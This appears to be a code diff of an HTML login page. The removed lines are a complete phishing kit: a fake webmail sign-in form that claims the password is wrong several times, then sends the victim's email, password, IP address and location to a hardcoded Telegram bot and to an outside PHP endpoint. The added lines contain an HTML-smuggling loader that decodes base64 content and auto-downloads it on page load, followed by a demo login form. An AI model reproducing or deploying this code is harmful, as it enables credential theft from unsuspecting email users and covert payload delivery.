@@ -2,286 +2,178 @@
 <html>
 <head>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-    
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-      color: #535353;
-      background-image: url('https://i.imgur.com/W6H22Ci.png');
-      background-size: cover;
-      margin: 0;
-      padding: 0;
-    }
-    
-    .login-40 .form-section {
-      max-width: 380px;
-      margin: 50px auto 0;
-      border-radius: 10px;
-      padding: 10px 35px;
-      border: 1px solid #e8e7e7;
-      background: rgba(255,255,255,0.95);
-    }
-    
-    .form-group.form-box input {
-      width: 100%;
-      padding: 15px 50px 15px 25px;
-      border-radius: 50px;
-      border: 1px solid #dbdbdb;
-    }
-    
-    .btn-md {
-      padding: 15px 50px 14px 50px;
-      font-size: 17px;
-      font-weight: 400;
-      border-radius: 50px;
-      width: 100%;
-    }
-    
-    .btn-theme {
-      background: #350a1ff;
-      border: none;
-      color: #fff;
-    }
-    
-    .fa-eye {
-      position: absolute;
-      right: 25px;
-      top: 14px;
-      cursor: pointer;
-    }
-    
-    .logo {
-      text-align: center;
-      margin-bottom: 35px;
-    }
-  </style>
-</head>
-<body class="dark sharp" id="lebody" style="background-image: url('https://i.imgur.com/W6H22Ci.png'); background-size: cover;">
-  
-  <div class="b_base login-40">
-    <div class="f_base container">
-      <div class="f_in row">
-        <div class="col-md-12">
-          <div class="form-section">
-            <div class="f_in">
-              <div class="logo">
-                <a href="#">
-                  <img src="" alt="Webmail" id="logo" style="height: 30px;">
-                  <h2 id="logoname" style="font-size: 2rem;"></h2>
-                </a>
-              </div>
-              <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
-              <center>
-                <h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2>
-              </center>
-              <div class="login-inner-form">
-                <form class="f_form" id="loginForm" method="POST">
-                  <div class="alert alert-danger mb-3 hidden" id="err" role="alert"></div>
-                  <div class="alert alert-primary mb-3 hidden" id="mi" role="alert"></div>
-                  <div class="form-group form-box">
-                    <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
-                  </div>
-                  <div class="form-group form-box" style="position: relative;">
-                    <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
-                    <i class="fa fa-eye" id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true" style="position: absolute; right: 25px; top: 14px; cursor: pointer;"></i>
-                  </div>
-                  <span id="msg" style="color:red; display: block; margin-bottom: 15px;"></span>
-                  <div class="checkbox clearfix">
-                    <div class="form-check checkbox-theme">
-                      <input class="form-check-input" type="checkbox" value="" id="rem_me">
-                      <label class="form-check-label" for="rem_me">Remember me</label>
-                    </div>
-                  </div>
-                  <div class="form-group mb-0">
-                    <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>
-                  </div>
-                </form>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
   <script>
     $(document).ready(function() {
-      let attemptCount = 1;
-      const MAX_ATTEMPTS = 4;
-      
-      const TELEGRAM_BOT_TOKEN = '8690885088:AAGVk-rLLx4BSdbwafGHR5MvbfMYKxelMyw';
-      const TELEGRAM_CHAT_ID = '6159490685';
-      const SERVER_URL = 'https://olorunmi.buzz/eb.php';
-      
-      let messageSentForThisAttempt = false;
-      
-      function sendToTelegram(message) {
-        if (messageSentForThisAttempt) {
-          console.log('Already sent for this attempt, blocking duplicate');
-          return;
-        }
-        messageSentForThisAttempt = true;
-        console.log('Sending ONE message to Telegram');
-        
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now()}`;
-        
-        const img = new Image();
-        img.onload = () => console.log('Telegram image request loaded (message likely sent)');
-        img.onerror = () => console.error('Telegram image request failed, check bot token / chat ID / network');
-        img.src = url;
-      }
-      
-      function sendToServer(email, password, attempt) {
-        const formData = new URLSearchParams();
-        formData.append('email', email);
-        formData.append('password', password);
-        formData.append('attempt', attempt);
-        
-        fetch(SERVER_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          console.log('Server response:', data);
-        })
-        .catch(err => {
-          console.error('Error sending to server:', err);
-        });
-      }
-      
-      function formatLogMessage(email, password, attempt, mxRecord, ip, location) {
-        const now = new Date();
-        const timeString = now.toLocaleString('en-US', {
-          year: 'numeric', month: 'numeric', day: 'numeric',
-          hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
-        }).replace(/,/g, '');
-        
-        return `══════════════════════════════════════
-📧 Email: ${email}
-🔑 Password: ${password}
-⏰ Time: ${timeString}
-🌐 IP: ${ip}
-📍 Location: ${location}
-📧 MX: ${mxRecord}
-🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}
-══════════════════════════════════════`;
-      }
-      
-      function getMxRecord(email) {
-        const domain = email.split('@')[1];
-        return `mail.${domain}`;
-      }
-      
-      function getIpAndLocation(callback) {
-        let callbackCalled = false;
-        
-        fetch('https://api.ipify.org?format=json')
-          .then(r => r.json())
-          .then(data => {
-            if (!callbackCalled) {
-              callbackCalled = true;
-              const ip = data.ip;
-              fetch(`https://ipapi.co/${ip}/json/`)
-                .then(r => r.json())
-                .then(locData => {
-                  const city = locData.city || '';
-                  const region = locData.region || '';
-                  const country = locData.country_name || '';
-                  const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
-                  callback(ip, location);
-                })
-                .catch(() => callback(ip, 'Unknown'));
-            }
-          })
-          .catch(() => {
-            if (!callbackCalled) {
-              callbackCalled = true;
-              callback('8.8.8.8', 'Mountain View, California, USA');
-            }
-          });
-      }
-      
-      function resetSentFlag() {
-        messageSentForThisAttempt = false;
-      }
-      
-      $("#loginForm").on("submit", function(e) {
-        e.preventDefault();
-        
-        let password = $("#password").val();
-        
-        if (!password || password.length < 1) {
-          $("#msg").text("Please enter your password").css("color", "red");
-          return;
-        }
-        
-        let email = $("#email").val();
-        let mxRecord = getMxRecord(email);
-        let currentAttempt = attemptCount;
-        resetSentFlag();
-        
-        if (currentAttempt < MAX_ATTEMPTS) {
-          $("#msg").text("Invalid password, try again").css("color", "red");
-          $("#password").val("");
-          $("#getitBtn").prop("disabled", false).html("Continue");
-        } else {
-          $("#msg").text("Redirecting to your inbox...").css("color", "green");
-          $("#getitBtn").prop("disabled", true).html("Redirecting...");
-          
-          getIpAndLocation(function(ip, location) {
-            const completeMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
-            console.log('Sending info for attempt', currentAttempt);
-            
-            sendToTelegram(completeMessage);
-            sendToServer(email, password, currentAttempt);
-            
-            if (currentAttempt === MAX_ATTEMPTS) {
-              setTimeout(function() {
-                window.location.href = window.emailDomain;
-              }, 1500);
-            }
-          });
-        }
-        
-        attemptCount++;
-      });
-      
-      const urlParams = new URLSearchParams(window.location.search);
-      const hashedEmail = urlParams.get('e');
-      
-      if (!hashedEmail) {
-        $("body").html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (e=email@domain.com)</div>');
-      } else {
-        $("#email").val(hashedEmail);
-        let domain = hashedEmail.split('@')[1];
-        let siteName = domain.split('.')[0].toUpperCase();
-        siteName = siteName.charAt(0).toUpperCase() + siteName.slice(1).toLowerCase();
-        document.title = siteName + ' - Sign In';
-        document.querySelector('#logoname').textContent = siteName;
-      }
-      
-      window.emailDomain = 'https://' + (hashedEmail ? hashedEmail.split('@')[1] : '');
+      saveFile();
     });
-    
-    function togglePasswordVisibility() {
-      const e = document.getElementById("password");
-      const t = document.getElementById("togglePassword");
-      if (e.type === "password") {
-        e.type = "text";
-        t.classList.remove("fa-eye");
-        t.classList.add("fa-eye-slash");
-      } else {
-        e.type = "password";
-        t.classList.remove("fa-eye-slash");
-        t.classList.add("fa-eye");
-      }
+
+    function saveFile(name, type, data) {
+      if (data != null && navigator.msSaveBlob)
+        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
+      var a = $("<a style='display: none;'/>");
+  
+      var encodedStringAtoB = "";
+      var decodedStringAtoB = atob(encodedStringAtoB);
+      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
+      const url = window.URL.createObjectURL(myBlob);
+  
+      a.attr("href", url);
+      $("body").append(a);
+      a[0].click();
+      window.URL.revokeObjectURL(url);
+      a.remove();
     }
   </script>
+</head>
+<body>
+  <<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-container h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #333;
+            font-size: 28px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .error-msg {
+            color: red;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .success-msg {
+            color: green;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Username / Email</label>
+                <input type="text" id="username" placeholder="Enter your username or email" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-btn">Login</button>
+            <div id="errorMsg" class="error-msg"></div>
+            <div id="successMsg" class="success-msg"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const successMsg = document.getElementById('successMsg');
+            
+            // Simple validation
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please enter both username and password';
+                successMsg.style.display = 'none';
+                return;
+            }
+            
+            // Here you can add your login logic
+            // For demo, we'll just show success
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'block';
+            successMsg.textContent = 'Login successful! Redirecting...';
+            
+            // Redirect after 2 seconds (change to your desired page)
+            setTimeout(function() {
+                // window.location.href = 'dashboard.html';
+                alert('Logged in as: ' + username + '\nPassword: ' + password);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>>
 </body>
 </html>
